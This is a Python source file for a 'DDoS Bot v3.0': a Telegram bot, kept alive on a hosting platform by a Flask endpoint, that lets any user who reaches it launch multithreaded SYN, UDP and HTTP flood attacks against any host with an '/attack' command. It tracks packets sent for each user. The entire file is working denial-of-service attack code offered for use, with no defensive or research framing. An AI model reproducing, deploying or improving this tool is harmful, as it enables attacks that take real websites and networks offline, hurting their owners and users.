#!/usr/bin/env python3
"""
🔥 DDoS Bot - Polling with Flask Port Binding
"""

import os
import json
import logging
import threading
import time
import socket
import requests
from pathlib import Path
from datetime import datetime
from dotenv import load_dotenv
from flask import Flask, jsonify

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
PORT = int(os.getenv("PORT", 10000))

if not TELEGRAM_BOT_TOKEN:
    raise ValueError("❌ TELEGRAM_BOT_TOKEN required")

MEMORY_FILE = "bot_memory.json"

# Flask app (binds to port)
app = Flask(__name__)

# ============================================================================
# MEMORY
# ============================================================================

class BotMemory:
    @staticmethod
    def load():
        if Path(MEMORY_FILE).exists():
            try:
                with open(MEMORY_FILE, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    @staticmethod
    def save(data):
        try:
            with open(MEMORY_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except:
            pass
    
    @staticmethod
    def get_user(user_id):
        memory = BotMemory.load()
        return memory.get(str(user_id), {
            "attacks": 0,
            "packets_sent": 0,
            "total_duration": 0,
            "favorite_target": None,
            "favorite_type": None,
        })
    
    @staticmethod
    def update_user(user_id, data):
        memory = BotMemory.load()
        memory[str(user_id)] = data
        BotMemory.save(memory)

# ============================================================================
# ATTACK ENGINE
# ============================================================================

class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.lock = threading.Lock()
        self.stats = {"total_packets": 0, "concurrent_attacks": 0}
    
    def syn_flood_worker(self, target_ip: str, target_port: int, user_id: int, intensity: int):
        attack = self.active_attacks.get(user_id)
        if not attack:
            return
        
        packets = 0
        while attack.get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(0.2)
                try:
                    sock.connect_ex((target_ip, target_port))
                except:
                    pass
                finally:
                    try:
                        sock.close()
                    except:
                        pass
                
                packets += 1
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['packets'] = packets
                        self.stats['total_packets'] += 1
                
                if intensity < 2:
                    time.sleep(0.002)
                elif intensity < 3:
                    time.sleep(0.001)
            except:
                pass
    
    def udp_flood_worker(self, target_ip: str, target_port: int, user_id: int, intensity: int):
        attack = self.active_attacks.get(user_id)
        if not attack:
            return
        
        packets = 0
        while attack.get('active', False):
            try:
                payload = os.urandom(512)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (target_ip, target_port))
                sock.close()
                
                packets += 1
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['packets'] = packets
                        self.stats['total_packets'] += 1
                
                if intensity < 2:
                    time.sleep(0.001)
            except:
                pass
    
    def http_flood_worker(self, target_host: str, target_port: int, user_id: int, intensity: int):
        try:
            target_ip = socket.gethostbyname(target_host)
        except:
            return
        
        attack = self.active_attacks.get(user_id)
        if not attack:
            return
        
        packets = 0
        while attack.get('active', False):
            try:
                request_data = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {target_host}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                ).encode()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                sock.sendall(request_data)
                sock.close()
                
                packets += 1
                with self.lock:
                    if user_id in self.active_attacks:
                        self.active_attacks[user_id]['packets'] = packets
                        self.stats['total_packets'] += 1
            except:
                pass
    
    def start_attack(self, user_id: int, target: str, attack_type: str, threads: int = 500, intensity: int = 2, duration: int = 60):
        try:
            if ':' in target:
                target_host, port_str = target.rsplit(':', 1)
                try:
                    target_port = int(port_str)
                except:
                    target_port = 80
            else:
                target_host = target
                target_port = 80
            
            try:
                target_ip = socket.gethostbyname(target_host)
            except socket.gaierror:
                return False, "❌ DNS resolution failed"
            
            with self.lock:
                self.active_attacks[user_id] = {
                    'target': target_host,
                    'ip': target_ip,
                    'port': target_port,
                    'type': attack_type,
                    'intensity': intensity,
                    'active': True,
                    'packets': 0,
                    'start_time': time.time(),
                    'threads': threads,
                    'duration': duration,
                    'worker_threads': []
                }
                self.stats['concurrent_attacks'] += 1
            
            worker_map = {
                'syn': self.syn_flood_worker,
                'udp': self.udp_flood_worker,
                'http': self.http_flood_worker,
            }
            
            if attack_type not in worker_map:
                return False, "❌ Invalid type"
            
            worker = worker_map[attack_type]
            attack_ctx = self.active_attacks[user_id]
            
            for i in range(threads):
                if attack_type == 'http':
                    t = threading.Thread(target=worker, args=(target_host, target_port, user_id, intensity), daemon=True)
                else:
                    t = threading.Thread(target=worker, args=(target_ip, target_port, user_id, intensity), daemon=True)
                t.start()
                attack_ctx['worker_threads'].append(t)
            
            def auto_stop():
                time.sleep(duration)
                self.stop_attack(user_id)
            
            timer = threading.Thread(target=auto_stop, daemon=True)
            timer.start()
            
            msg = (
                f"🚀 *ATTACK ACTIVE*\n\n"
                f"🎯 Target: `{target_host}:{target_port}`\n"
                f"⚔️ Type: `{attack_type.upper()}`\n"
                f"💪 Intensity: `{intensity}/5`\n"
                f"🧵 Threads: `{threads}`\n"
                f"⏱️ Duration: `{duration}s`"
            )
            return True, msg
        
        except Exception as e:
            return False, f"❌ Error: {str(e)}"
    
    def stop_attack(self, user_id: int):
        with self.lock:
            if user_id not in self.active_attacks:
                return False, {}
            
            attack = self.active_attacks[user_id]
            attack['active'] = False
            duration = time.time() - attack['start_time']
            packets = attack.get('packets', 0)
            
            for t in attack.get('worker_threads', []):
                try:
                    t.join(timeout=0.5)
                except:
                    pass
            
            self.stats['concurrent_attacks'] = max(0, self.stats['concurrent_attacks'] - 1)
            del self.active_attacks[user_id]
            return True, {'packets': packets}
    
    def get_status(self, user_id: int):
        with self.lock:
            if user_id not in self.active_attacks:
                return {'active': False}
            
            attack = self.active_attacks[user_id]
            duration = time.time() - attack['start_time']
            packets = attack.get('packets', 0)
            pps = int(packets / max(duration, 1))
            
            return {
                'active': True,
                'target': attack['target'],
                'port': attack['port'],
                'packets': packets,
                'duration': int(duration),
                'pps': pps
            }

attack_mgr = AttackManager()

# ============================================================================
# FLASK ENDPOINTS (PORT BINDING)
# ============================================================================

@app.route('/', methods=['GET'])
def health():
    """Health check - REQUIRED for Render port binding"""
    return jsonify({
        'status': 'running',
        'bot': 'DDoS Bot v3.0',
        'timestamp': datetime.now().isoformat(),
        'concurrent_attacks': attack_mgr.stats['concurrent_attacks'],
        'total_packets': attack_mgr.stats['total_packets']
    }), 200

@app.route('/stats', methods=['GET'])
def stats():
    """Get stats"""
    return jsonify({
        'concurrent_attacks': attack_mgr.stats['concurrent_attacks'],
        'total_packets': attack_mgr.stats['total_packets']
    }), 200

# ============================================================================
# TELEGRAM BOT POLLING (BACKGROUND)
# ============================================================================

class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.offset = 0
    
    def get_updates(self):
        try:
            url = f"{self.base_url}/getUpdates"
            resp = requests.post(url, json={"offset": self.offset, "timeout": 30}, timeout=35)
            data = resp.json()
            if data.get('ok'):
                return data.get('result', [])
        except Exception as e:
            logger.error(f"Get updates error: {e}")
        return []
    
    def send_message(self, chat_id, text, parse_mode="Markdown"):
        try:
            url = f"{self.base_url}/sendMessage"
            requests.post(url, json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": parse_mode
            })
        except Exception as e:
            logger.error(f"Send message error: {e}")
    
    def send_menu(self, chat_id, text):
        try:
            url = f"{self.base_url}/sendMessage"
            requests.post(url, json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "Markdown",
                "reply_markup": {
                    "inline_keyboard": [
                        [{"text": "🎯 DDoS Attack", "callback_data": "ddos_mode"},
                         {"text": "📊 Stats", "callback_data": "stats"}],
                        [{"text": "🛑 Stop", "callback_data": "stop_attack"},
                         {"text": "❓ Help", "callback_data": "help"}]
                    ]
                }
            })
        except Exception as e:
            logger.error(f"Send menu error: {e}")
    
    def handle_update(self, update):
        if 'message' in update:
            self.handle_message(update['message'])
        elif 'callback_query' in update:
            self.handle_callback(update['callback_query'])
        
        self.offset = update.get('update_id', 0) + 1
    
    def handle_message(self, message):
        chat_id = message['chat']['id']
        text = message.get('text', '').strip()
        user_id = message['from']['id']
        
        if text == '/start':
            self.send_menu(chat_id, 
                "⚡ *DDoS Bot v3.0*\n\n"
                "Multi-layer attack orchestrator\n\n"
                "🔥 Features:\n"
                "• TCP SYN Flood\n"
                "• UDP Volumetric\n"
                "• HTTP Application"
            )
        elif text == '/help':
            self.send_message(chat_id,
                "*syn* | *udp* | *http*\n"
                "`/attack target.com syn 500 2 60`"
            )
        elif text == '/status':
            status = attack_mgr.get_status(user_id)
            if status['active']:
                msg = f"📊 *LIVE*\n🎯 `{status['target']}`\n📤 `{status['packets']:,}` packets"
            else:
                msg = "❌ No active attack"
            self.send_message(chat_id, msg)
        elif text == '/stop':
            success, stats = attack_mgr.stop_attack(user_id)
            msg = f"🛑 *Stopped*\n📤 `{stats.get('packets', 0):,}` packets" if success else "❌ No attack"
            self.send_message(chat_id, msg)
        elif text.startswith('/attack '):
            parts = text[8:].split()
            if len(parts) < 2:
                self.send_message(chat_id, "❌ Format: `/attack target type [threads] [intensity] [duration]`")
                return
            
            target = parts[0]
            attack_type = parts[1].lower()
            threads = int(parts[2]) if len(parts) > 2 else 500
            intensity = int(parts[3]) if len(parts) > 3 else 2
            duration = int(parts[4]) if len(parts) > 4 else 60
            
            success, msg = attack_mgr.start_attack(user_id, target, attack_type, threads, intensity, duration)
            self.send_message(chat_id, msg)
    
    def handle_callback(self, callback):
        chat_id = callback['message']['chat']['id']
        data = callback['data']
        user_id = callback['from']['id']
        
        if data == "ddos_mode":
            self.send_message(chat_id, "🎯 Send target:\n`target.com` or `192.168.1.1:8080`")
        elif data == "stats":
            status = attack_mgr.get_status(user_id)
            msg = f"📊 `{status['target']}`\n📤 `{status['packets']:,}`" if status['active'] else "❌ No active"
            self.send_message(chat_id, msg)
        elif data == "stop_attack":
            success, stats = attack_mgr.stop_attack(user_id)
            self.send_message(chat_id, "🛑 Stopped" if success else "❌ No attack")
        elif data == "help":
            self.send_message(chat_id, "*syn* | *udp* | *http*")
    
    def run(self):
        """Polling loop"""
        logger.info("🚀 Bot polling started")
        while True:
            try:
                updates = self.get_updates()
                for update in updates:
                    self.handle_update(update)
                time.sleep(0.1)
            except Exception as e:
                logger.error(f"Bot error: {e}")
                time.sleep(5)

# ============================================================================
# MAIN
# ============================================================================

def start_bot_polling():
    """Start bot in background thread"""
    bot = TelegramBot(TELEGRAM_BOT_TOKEN)
    thread = threading.Thread(target=bot.run, daemon=True)
    thread.start()

if __name__ == "__main__":
    # Start bot polling in background
    start_bot_polling()
    
    # Start Flask app on port (required for Render)
    logger.info(f"🚀 Flask server on 0.0.0.0:{PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
